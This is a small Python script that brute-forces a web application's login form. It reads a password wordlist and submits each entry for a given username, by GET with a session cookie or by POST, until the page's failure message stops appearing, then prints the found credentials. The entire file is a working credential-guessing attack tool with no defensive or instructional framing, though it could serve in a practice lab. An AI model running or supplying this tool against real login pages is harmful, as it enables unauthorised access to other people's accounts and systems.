import requests


url= input('[+] Enter Page URL: ')
username= input('[+] Enter Username For The Account To Bruteforce:')
password_file= input('[+] Enter Password File To Use: ')
loginFailedString= input('[+]Enter String That Occurs When Login Fails: ')
cookie_value = input('[+]Enter a Cookie Session')
def cracking(username, url):
    for password in file1:
        password = password.strip()
        print("trying ", password)
        data= {'username': username, 'password': password, 'Login':'Submit'}  # in the left of the dictionary specify the name of the tag, and in the right specify the data, in the button protion specify the the button tag name that is Login, and type of the button that is submit
        if cookie_value!= '':
            resposne= requests.get(url, params= {'username':username, 'password':password, 'Login': 'Login'}, cookies = {'Cookie': cookie_value})
        else :
            resposne = requests.post(url, data= data)

        if loginFailedString in resposne.content.decode():
            pass
        else:
            print("[+] Found Username: ", username)
            print("[+] Found Password: ", password)
            exit()
with open(password_file, 'r') as file1:
     cracking(username, url)
     
     
print("Password in not in list")
